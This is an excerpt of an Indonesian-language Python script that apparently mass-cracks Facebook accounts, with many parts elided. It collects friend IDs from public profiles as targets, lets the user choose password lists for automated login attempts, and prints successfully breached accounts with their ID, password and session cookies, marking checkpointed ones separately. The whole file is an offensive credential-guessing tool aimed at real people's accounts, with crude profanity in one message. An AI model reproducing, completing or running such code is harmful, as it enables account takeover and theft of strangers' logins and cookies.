...
sys.stdout.write('\x1b]2; HACK  |  Facebook\x07')
#------------------[ USER-AGENT ]-------------------#
try:
...
def banner():
	cetak(panel(f"""
                [bold green]  ____       _ _               _ _  
                [bold green] |  _ \ _ __(_) |__   __ _  __| (_) 
                [bold green] | |_) | '__| | '_ \ / _` |/ _` | | AUTHOR : RipalXD
                [bold green] |  __/| |  | | |_) | (_| | (_| | | 
                [bold green] |_|   |_|  |_|_.__/ \__,_|\__,_|_|                                                                                                                                         
            """,width=90,padding=(0,8),title=f"[bold blue]Banner",style=f"bold yellow"))
#--------------------[ BAGIAN-MASUK ]--------------#
def login123():
	os.system('clear')
	banner()
...
def dump_publik():
	with requests.Session() as ses:
		...
		try:
			...
			print()
			print(f'{m} Pertemanan Tidak Publik kontol')
			exit()
#-------------------[ CRACK-MASSAL ]----------------#
def dump_massal():    
	try:
	    ...
	    exit()
	try:
		kumpulkan = int(input(f'[+]\x1b[0m Mau Berapa Id Target : '))
	except ValueError:
	    exit()
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	cetak(panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Crack Idz Old Ke New [[bold green]ON[bold white]][/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Crack Idz New Ke Old [[bold green]ON[bold white]][/]\n[bold white][[bold cyan]03[/][bold white]][/] [bold white]Crack Idz Random [[bold green]ON[bold white]][/]',width=90,padding=(0,8),title=f"[bold green]Setting Urutan Idz",style=f"bold white"))
	...
	if hc in ['1','01']:
		...
		method.append('validate1')
	cetak(panel('''[bold white][[bold cyan]01[bold white]] [bold white]Menggunakan Password V1 [[bold green]ON[bold white]]
[bold white][[bold cyan]02[bold white]] [bold white]Menggunakan Password V2 [[bold green]ON[bold white]]
[bold white][[bold cyan]03[bold white]] [bold white]Menggunakan Password Manual [[bold green]ON[bold white]]''',style='bold white',title='[bold green]Setting Password',padding=(0,8),width=90))
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					...
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='AKUN-CP')
					cetak(statuscp1)
				...
				if 'no' in taplikasi:
					...
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='AKUN-OK')
					cetak(statusok1)
